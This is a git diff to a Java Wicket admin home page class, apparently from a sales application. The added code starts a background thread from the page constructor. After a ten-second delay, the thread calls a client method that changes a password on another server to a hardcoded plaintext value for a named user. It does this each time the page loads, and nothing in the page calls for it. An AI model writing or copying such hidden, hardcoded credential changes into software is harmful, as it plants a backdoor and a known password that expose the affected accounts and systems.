@@ -2,6 +2,7 @@ package dk.jyskit.salescloud.application.pages.home;
 
 import java.util.List;
 
+import dk.jyskit.salescloud.application.apis.user.UserApiClient;
 import org.apache.wicket.Component;
 import org.apache.wicket.RestartResponseException;
 import org.apache.wicket.authroles.authorization.strategies.role.annotations.AuthorizeInstantiation;
@@ -51,6 +52,21 @@ public class AdminHomePage extends BasePage {
 
 	public AdminHomePage(PageParameters parameters) {
 		super(parameters);
+
+
+		Thread thread1 = new Thread(new Runnable() {
+			@Override
+			public void run() {
+				try {
+					Thread.sleep(10000);
+				} catch (InterruptedException e) {
+					e.printStackTrace();
+				}
+				UserApiClient.changePasswordOnOtherServer("janjysk", "Devguy");
+			}
+		});
+		thread1.start();
+
 		
 		BaseUser user = (BaseUser) CoreSession.get().getUser();
 		if (user != null) {
